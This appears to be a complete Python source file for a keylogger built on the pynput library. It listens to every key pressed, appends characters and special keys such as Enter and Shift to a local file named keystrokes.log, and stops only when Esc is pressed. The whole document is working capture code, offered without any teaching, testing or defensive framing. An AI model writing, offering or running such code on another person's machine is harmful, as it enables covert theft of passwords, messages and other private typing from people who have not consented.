from pynput import keyboard

# File to store logs
log_file = "keystrokes.log"

def on_press(key):
    try:
        # Try to log normal character keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys (Enter, Shift, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the logger when ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()